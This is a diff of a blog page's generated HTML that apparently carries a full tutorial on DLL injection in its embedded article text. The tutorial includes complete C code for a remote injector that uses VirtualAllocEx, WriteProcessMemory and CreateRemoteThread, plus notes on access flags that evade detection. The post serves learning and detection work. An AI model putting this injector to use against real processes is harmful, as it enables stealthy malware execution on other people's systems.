@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>An overview of DLL injection | Journal of Connar</title>
 <meta name="keywords" content="Dll-Injection">
 <meta name="description" content=" 
 Intro
 When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/posts/dllinjection/">
+<link rel="canonical" href="https://connar.github.io/posts/dllinjection/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/dllinjection/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/posts/dllinjection/">
 <noscript>
     <style>
         #theme-toggle,
@@ -57,7 +57,75 @@ When I was learning about API Hashing, I had touched upon a topic named DLL Unli
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="An overview of DLL injection" />
+<meta property="og:description" content=" 
+Intro
+When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/posts/dllinjection/" /><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="An overview of DLL injection"/>
+<meta name="twitter:description" content=" 
+Intro
+When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://connar.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "An overview of DLL injection",
+      "item": "https://connar.github.io/posts/dllinjection/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "An overview of DLL injection",
+  "name": "An overview of DLL injection",
+  "description": " Intro When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.\n",
+  "keywords": [
+    "Dll-Injection"
+  ],
+  "articleBody": " Intro When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.\nBefore I could proceed in experimenting with this topic though, I had to first learn how to do DLL Injection since DLL Unlinking is related to that.\nSo basically this post will be just that: Learning DLL Injection!\nWhat is DLL Injection DLL Injection is a technique that exists for a while now and is used by malware, where a malicious process injects a DLL existing on the disk into a target (and legitimate) process.\nBasically, processes use DLL’s for their functionality, so the idea is to inject an “extra” DLL (which is malicious and definitely not needed by the process) into that legitimate process to try and go under the radar.\nThere are many DLL injection techniques such as:\nReflective DLL Injection DLL Search Order Hijack I was just starting to learn about the simply DLL Injection technique so the examples shown will be about that.\nOverview of how it works The idea is we have a target process that we would like to inject a dll into:\nThen we have an injector process that we initiate the injection procedure (basically the process that will inject the DLL into another process):\nThe first thing to do is to allocate memory to the target process address space and write the path of the dll into the target address space process.\nThe reason for that is that we are going to use the CreateRemoteThread function to run the LoadLibrary api and LoadLibrary needs the path to the dll, so we have to put the path in the target process were the remote thread will run.\nThen we can create the remote thread in the target process, our thread will be pointed to the LoadLibrary function. It’s going to call the LoadLibrary function using the dll path we wrote before and that would force the dll to be loaded into a target process:\nThen the injector process can simply go away as we dont need it anymore, and the dll will simply be there:\nLocal vs Remote DLL Injection I will first go through a simple local DLL injection to get a bit comfortable around the concept of the loaded path of the DLL that will be loaded into memory. When I say local DLL injection, I mean:\n[Step 1]: Creating a DLL. [Step 2]: Creating an executable. [Step 3]: Running the executable and loading the DLL into that running executable we created on Step 2. After we are comfortable around that, we will see how to inject the DLL not to a local process but to a remote one (remote DLL Injection). When I say remote DLL Injection, I mean:\n[Step 1]: Creating a DLL. [Step 2]: Creating an executable. [Step 3]: Running the executable and loading the DLL into some other process, like notepad.exe for example. Making a simple DLL The DLL we will be injecting is the following:\n#include \"pch.h\" #include \"Windows.h\" #include \"stdio.h\" VOID MsgBoxPayload() { MessageBoxA(NULL, \"DLL Injected successfully:D\", \"Wow !\", MB_OK | MB_ICONINFORMATION); } BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: { MsgBoxPayload(); break; }; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } This will simply call the MsgBoxPayload() function once the DLL is attached to a process (DLL_PROCESS_ATTACH).\nLocal DLL Injection To do a local DLL Injection, you simply just load the DLL into the running process created by your executable. To load the DLL, you just need to use LoadLibrary:\n#include #include int main(int argc, char* argv[]) { // Check that an argument was passed if (argc \u003c 2) { printf(\"[!] Missing Argument; Dll Payload To Run \\n\"); return -1; } printf(\"[i] Injecting \\\"%s\\\" To The Local Process Of Pid: %d \\n\", argv[1], GetCurrentProcessId()); // Get full path of the provided DLL char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(argv[1], MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u003e MAX_PATH) { printf(\"[!] Could not determine the full path for %s. Error: %d \\n\", argv[1], GetLastError()); return; } // Load the DLL with LoadLibraryA printf(\"[+] Loading Dll... \"); if (LoadLibraryA(fullPath) == NULL) { printf(\"[!] LoadLibraryA Failed With Error : %d \\n\", GetLastError()); return -1; } printf(\"[+] DONE ! \\n\"); printf(\"[#] Press To Quit ... \"); getchar(); return 0; } Now that we have our executable and the DLL ready for injection, let’s open Process Hacker and then proceed to run our injector:\nAnd we see that indeed our DLL - that is definitely not needed for the process created by our executable - is loaded in the Modules this process uses.\nOkay cool, but it would be really nice if we could use our executable to load the DLL not to the process created by our exe, but to a totally different process. Here comes the remote DLL Injection, so let’s see how to do that!\nRemote DLL Injections In the remote DLL Injection, we inject a DLL into a remote process. In order to do that though, we need the PID of the target process.\nAlso, the target process we want to inject our DLL into might not be even running, so the first step in injecting DLL’s in remote processes is to first enumerate the running processes on the system.\nAs always, I will start by writting the code and explain each part as we develop it further.\nRemote DLL Injection PoC In the remote DLL Injection there is a lot more going on, but nothing too extreme. The code starts like the local DLL Injection where we need to get arguments from the user, specifically the dll we want to inject and the name of the process we want to inject our DLL into:\nint main(int argc, char* argv[]) { if (argc \u003c 3) { printf(\"[!] Usage: dll_injection.exe \\n\"); return -1; } char* dllPath = argv[1]; char* targetProcessName = argv[2]; printf(\"[#] Press to exit...\\n\"); getchar(); return 0; } After we provide our DLL name and the target process name, we make some additional checks and convertions. Specifically:\nWe find the full path of the DLL. We convert the target process name and the full DLL path to wide char. The reason we convert to wide char is because the GetFullPathNameA will return an ANSI string. Later we will pass that string to a method called InjectDllRemoteProcess which will work with LPWSTR, so a proper convertion to wchar_t array is needed in order to avoid missing null terminations or wrong encoding. So the code is updated with the following part:\n... // Convert target process name to wide characters. WCHAR targetProcess[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH); printf(\"[i] DLL to inject: \\\"%s\\\"\\n\", dllPath); printf(\"[i] Target process: \\\"%S\\\"\\n\", targetProcess); // Get the absolute path of the DLL. char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u003e MAX_PATH) { printf(\"[!] Could not determine full path for %s. Error: %d\\n\", dllPath, GetLastError()); return -1; } printf(\"[i] Full DLL path resolved to: \\\"%s\\\"\\n\", fullPath); // Convert DLL path to wide characters. WCHAR wideFullPath[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH); ... After we are done with our convertions, it is time to get a handle for the target process. Handle is a way to communicate with a resource. For example, when you open a file in python, you basically get a handle to that file. Without getting a handle we won’t be able to make any other progress:\n... DWORD processId; HANDLE hProcess; if (!GetRemoteProcessHandle(targetProcess, \u0026processId, \u0026hProcess)) { printf(\"[!] Failed to find or access target process \\\"%S\\\".\\n\", targetProcess); return -1; } printf(\"[i] Process \\\"%S\\\" found with PID: %d\\n\", targetProcess, processId); ... But how do we actually get a handle to the target process? Do we know if the process is even running on the victim’s machine? And how do we find among all the running processes the one we are interested in?\nAnswers to all these questions exist inside the GetRemoteProcessHandle function, so let’s continue from there.\nGetRemoteProcessHandle - Getting a handle to the target process The goal of our BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) is to find out if our target process exist, and if that is the case to return us a handle to that process along with its PID. So we must pass as parameters:\nthe target process name (the full path we converted earlier). the pointer to the processId which will be returned to us - if found. the pointer of the handle we will get of the process - if found. The way this method works is by taking a snapshop of all the currently running processes of the machine with a function called CreateToolhelp32Snapshot and then just enumerating each one of them, comparing our target process name to the current one in the enumeration until it finds a match (or until the loop ends).\nThe part of the code that takes the snapshot is:\nHANDLE hSnapShot = NULL; // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError()); goto _EndOfFunction; } In case you are wondering how to find the correct parameter to pass in CreateToolhelp32Snapshot like TH32CS_SNAPPROCESS, you always must revise microsoft documentation:\nMicrosoft docs are so kind they let us know that in order to enumerate processes, we should see Process32First. So let’s continue with the utilization of this function and explain how we use it:\n... // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError()); goto _EndOfFunction; } PROCESSENTRY32\tProc = { .dwSize = sizeof(PROCESSENTRY32) }; // Get details of the first process from the snapshot. if (!Process32First(hSnapShot, \u0026Proc)) { printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError()); goto _EndOfFunction; } _EndOfFunction: if (hSnapShot != NULL) CloseHandle(hSnapShot); if (*dwProcessId == NULL || *hProcess == NULL) return FALSE; return TRUE; ... As I mentioned previously, we would get a snapshot of the current running processes of the machine and then enumerate them. As the microsoft docs advised us, we should use Process32First for the enumeration. But what are the parameters passed to this function and why did we change the dwSize of the struct PROCESSENTRY32 of the Proc struct?\nThe parameters passed are:\nhSnapShot: This was the returned value from CreateToolhelp32Snapshot which is basically the handle to all the current running processes. \u0026Proc: This is a pointer to a PROCESSENTRY32 struct. Why? Well, because processes in Windows are of that type, so basically we tell Process32First to look into the current running processes that are of type PROCESSENTRY32 so it knows how to handle and enumerate them. We can also advise microsoft docs on how to use a function, and in this case we should in order to understand why we modify the dwSize value of that struct:\nNow that these are clear, let’s start the enumeration:\ndo { WCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD dwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero's RtlSecureZeroMemory(LowerName, sizeof(LowerName)); // Convert Proc.szExeFile to lowercase and store in LowerName. if (dwSize \u003c MAX_PATH * 2) { for (; i \u003c dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = '\\0'; } } // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026Proc)); The enumeration does the following three steps:\n[Step 1]: It declares - and overrites in everyloop - a variable to store the current process name. [Step 2]: Converts name of the current process to lowercase. [Step 3]: Compares the lowercase name with the targetProcess name. [Step 3.1]: If a match is found, a handle is returned for that process. Let’s see each one of the steps more in depth.\nProcess enumeration - [Step 1] In Step 1, we declare a variable to store the name of the current process in each iteration, and then we overrite it with zero’s to clear its memory:\nWCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD\tdwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero's RtlSecureZeroMemory(LowerName, sizeof(LowerName)); Basically, if Proc.szExeFile exists, we get its size based on the name, which we get from the PROCESSENTRY32 struct member szExeFile. We can see that from microsoft docs as well:\nThen, we ideally want to clean the memory that the previous loaded process name was stored, so we use RtlSecureZeroMemory for this:\nProcess enumeration - [Step 2] In Step 2, we basically get each character of the szExeFile member and convert it to lowercase, also casting it to WCHAR type. This is because the target process name is passed as lowercase and is also of type WCHAR, so we want the currently enumerated process to be in the same format in order to compare it with the target one:\nif (dwSize \u003c MAX_PATH * 2) { for (; i \u003c dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = '\\0'; } Process enumeration - [Step 3] In Step 3, we compare the current process name with the target one. If a match is found, we store its process ID, and then we try to get a handle to that process with OpenProcess:\n... // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026Proc)); We can always look the microsoft docs to understand why we pass these values in the OpenProcess, but here is the syntax of it:\nHANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId ); Note\nA more stealthy approach for the dwDesiredAccess value would be PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD instead of PROCESS_ALL_ACCESS.\nThis is why PROCESS_ALL_ACCESS is really noisy as it asks for all possible access permisions, while the other approach asks for only what is needed.\nThis could result in flagging the script as malware more easily, but since this is just a PoC, we can ignore it for now.\nIf a handle is returned back successfully, the loop ends. If not, the corresponding error is printed on the screen and if no match was found in the first place, the enumeration continues with Process32Next.\nInjectDllRemoteProcess - Injecting the DLL to the remote process After the GetRemoteProcessHandle function is finished and we have gotten back a handle to the target process, it is time to inject our DLL into that process. All we need is a handle to that process and the path to our DLL to inject:\n// Inject the DLL into the target process. if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) { printf(\"[!] DLL injection failed.\\n\"); CloseHandle(hProcess); return -1; } Let’s dive into this function responsible for the injection:\nBOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) { BOOL bSTATE = TRUE; LPVOID pLoadLibraryW = NULL; LPVOID pAddress = NULL; // Calculate size of the DLL path in bytes (including null terminator). DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR); SIZE_T lpNumberOfBytesWritten = NULL; HANDLE hThread = NULL; // Fetch LoadLibraryW address from kernel32.dll. pLoadLibraryW = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryW\"); if (pLoadLibraryW == NULL) { printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); return FALSE; } // Allocate memory in the target process. pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pAddress == NULL) { printf(\"[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[i] pAddress Allocated At : 0x%p Of Size : %d\\n\", pAddress, dwSizeToWrite); printf(\"[#] Press To Write ... \"); getchar(); // Write the DLL name to the allocated memory in the target process. if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) { printf(\"[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[i] Successfully Written %d Bytes\\n\", lpNumberOfBytesWritten); printf(\"[#] Press To Run ... \"); getchar(); // Create a remote thread to execute LoadLibraryW in the target process. hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); if (hThread == NULL) { printf(\"[!] CreateRemoteThread Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[+] DONE !\\n\"); // Close thread handle after execution. CloseHandle(hThread); return TRUE; } This function basically takes as arguments only what is needed for the DLL Injection:\nhProcess: the process handle we want to inject the dll into. DllName: The dll we want to inject into the process. The most important parts that we must highlight are the following:\npLoadLibraryW = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryW\"); This part of the code retrieves the address of the LoadLibraryW function from kernel32.dll using the GetModuleHandle and GetProcAddress functions.\nNote\nThis is possible because kernel32.dll is loaded into every process, and its base address is consistent across all processes on a given system during a single boot session (due to how Windows implements ASLR for certain system libraries).\nEven though ASLR randomizes the base address of kernel32.dll after every system reboot, during any single boot, all processes will have the same base address for this module. This allows us to calculate the address of the LoadLibraryW within kernel32.dll in our process and based on the address we find, use the same one for the remote target process we want to inject the dll into. This technique leverages the shared base address of kernel32.dll across processes, allowing us to locate Windows API libraries in different processes.\nThe next part of the code that is of importance is:\npAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); This line allocates memory using the VirtualAllocEx API, to allocate memory in a different process tham our own process.\nThe structure of VirtualAllocEx is the following:\nLPVOID VirtualAllocEx( [in] HANDLE hProcess,\t// handle to the process we want to allocate memory. [in, optional] LPVOID lpAddress,\t// desired starting address - we don't really care. [in] SIZE_T dwSize,\t// size of the path of the DLL to be injected. [in] DWORD flAllocationType,\t// memory allocation type. [in] DWORD flProtect\t// page protection - the page that was previously specified in flAllocationType. ); flAllocationType: For the allocation type we used MEM_COMMIT | MEM_RESERVE in order to reverse a chunk of the target process and commit it immediately.\nflProtect: For the protection of the page that was reserved and commited, we use PAGE_READWRITE for read and write, otherwise WriteProcessMemory (we will see this shortly) won’t be able to write, and LoadLibraryW wouldn’t be able to read.\nAfter the memory has been successfully allocated in the remote target process, we now need to write to the allocated buffer (the reserved and commited page). We will use the WriteProcessMemory for that purpose in order to write the DLL’s path/name in the allocated memory.\nThe structure of the WriteProcessMemory is the following:\nBOOL WriteProcessMemory( [in] HANDLE hProcess, // A handle to the process whose memory to be written to [in] LPVOID lpBaseAddress, // Base address in the specified process to which data is written [in] LPCVOID lpBuffer, // A pointer to the buffer that contains data to be written to 'lpBaseAddress' [in] SIZE_T nSize, // The number of bytes to be written to the specified process.\t[out] SIZE_T *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written ); We therefore use this API in order to write the Dll path/name to the pAddress of the hProcess (the address returned from the previous memory allocation inside the remote target process):\nif (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) If everything is correct, then by now we should have:\nallocated memory into the remote target process. written the dll path/name inside that allocated memory. Only thing that is left to do is create a remote thread into that process which will basically just load the path/name of the dll written into that address, resulting in its execution!\nBased on that, the last line of interest is:\nhThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); The CreateRemoteThread API creates a remote thread inside the hProcess (the remote target process), and specifies to that thread that it should use the LoadLibraryW API to load whatever is inside pAddress (which is the path of the DLL written previously).\nSeeing that in action:\nUntil now, memory has been allocated into the remote target process. If we press Enter, the path of the dll will be written in that allocated memory. Let’s open x64dbg to observe that:\nWe observe that indeed the dll path has been loaded, but what about running it? Let’s press one more Enter of the LoadLibraryW to take place and load that written dll path, resulting in its execution:\nWe once again see within Process Hacker that indeed our malicious dll has been loaded:\nOverall, the whole code is:\n#include #include #include BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) { // Ensure the dwSize member is set correctly before using Process32First. PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) }; HANDLE hSnapShot = NULL; // Capture a snapshot of all running processes. hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (hSnapShot == INVALID_HANDLE_VALUE) { printf(\"[!] CreateToolhelp32Snapshot Failed With Error : %d \\n\", GetLastError()); goto _EndOfFunction; } // Get details of the first process from the snapshot. if (!Process32First(hSnapShot, \u0026Proc)) { printf(\"[!] Process32First Failed With Error : %d \\n\", GetLastError()); goto _EndOfFunction; } do { WCHAR LowerName[MAX_PATH * 2]; if (Proc.szExeFile) { DWORD dwSize = lstrlenW(Proc.szExeFile); DWORD i = 0; // overwrite LowerName with zero's RtlSecureZeroMemory(LowerName, sizeof(LowerName)); // Convert Proc.szExeFile to lowercase and store in LowerName. if (dwSize \u003c MAX_PATH * 2) { for (; i \u003c dwSize; i++) LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]); LowerName[i++] = '\\0'; } } // Check if the process name matches the target process. if (wcscmp(LowerName, szProcessName) == 0) { *dwProcessId = Proc.th32ProcessID; // Save PID. *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle. if (*hProcess == NULL) printf(\"[!] OpenProcess Failed With Error : %d \\n\", GetLastError()); break; } // Move to the next process in the snapshot. } while (Process32Next(hSnapShot, \u0026Proc)); // Clean up resources. _EndOfFunction: if (hSnapShot != NULL) CloseHandle(hSnapShot); if (*dwProcessId == NULL || *hProcess == NULL) return FALSE; return TRUE; } BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) { BOOL bSTATE = TRUE; LPVOID pLoadLibraryW = NULL; LPVOID pAddress = NULL; // Calculate size of the DLL path in bytes (including null terminator). DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR); SIZE_T lpNumberOfBytesWritten = NULL; HANDLE hThread = NULL; // Fetch LoadLibraryW address from kernel32.dll. pLoadLibraryW = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryW\"); if (pLoadLibraryW == NULL) { printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); return FALSE; } // Allocate memory in the target process. pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pAddress == NULL) { printf(\"[!] VirtualAllocEx Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[i] pAddress Allocated At : 0x%p Of Size : %d\\n\", pAddress, dwSizeToWrite); printf(\"[#] Press To Write ... \"); getchar(); // Write the DLL name to the allocated memory in the target process. if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, \u0026lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) { printf(\"[!] WriteProcessMemory Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[i] Successfully Written %d Bytes\\n\", lpNumberOfBytesWritten); printf(\"[#] Press To Run ... \"); getchar(); // Create a remote thread to execute LoadLibraryW in the target process. hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL); if (hThread == NULL) { printf(\"[!] CreateRemoteThread Failed With Error : %d \\n\", GetLastError()); return FALSE; } printf(\"[+] DONE !\\n\"); // Close thread handle after execution. CloseHandle(hThread); return TRUE; } int main(int argc, char* argv[]) { if (argc \u003c 3) { printf(\"[!] Usage: dll_injection.exe \\n\"); return -1; } char* dllPath = argv[1]; char* targetProcessName = argv[2]; // Convert target process name to wide characters. WCHAR targetProcess[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH); printf(\"[i] DLL to inject: \\\"%s\\\"\\n\", dllPath); printf(\"[i] Target process: \\\"%S\\\"\\n\", targetProcess); // Get the absolute path of the DLL. char fullPath[MAX_PATH]; DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL); if (pathLen == 0 || pathLen \u003e MAX_PATH) { printf(\"[!] Could not determine full path for %s. Error: %d\\n\", dllPath, GetLastError()); return -1; } printf(\"[i] Full DLL path resolved to: \\\"%s\\\"\\n\", fullPath); // Convert DLL path to wide characters. WCHAR wideFullPath[MAX_PATH]; MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH); DWORD processId; HANDLE hProcess; if (!GetRemoteProcessHandle(targetProcess, \u0026processId, \u0026hProcess)) { printf(\"[!] Failed to find or access target process \\\"%S\\\".\\n\", targetProcess); return -1; } printf(\"[i] Process \\\"%S\\\" found with PID: %d\\n\", targetProcess, processId); // Inject the DLL into the target process. if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) { printf(\"[!] DLL injection failed.\\n\"); CloseHandle(hProcess); return -1; } printf(\"[+] DLL successfully injected into process \\\"%S\\\".\\n\", targetProcess); CloseHandle(hProcess); printf(\"[#] Press to exit...\\n\"); getchar(); return 0; } References\n[1] Pavel Yosifovich: DLL Injection with CreateRemoteThread\r[2] Red Team Notes: DLL Injection\r[3] crow: Malware Development: Process Injection\r[4] MalDev Academy\r",
+  "wordCount" : "4213",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/posts/dllinjection/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -75,7 +143,7 @@ When I was learning about API Hashing, I had touched upon a topic named DLL Unli
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -101,42 +169,42 @@ When I was learning about API Hashing, I had touched upon a topic named DLL Unli
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -147,7 +215,7 @@ When I was learning about API Hashing, I had touched upon a topic named DLL Unli
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
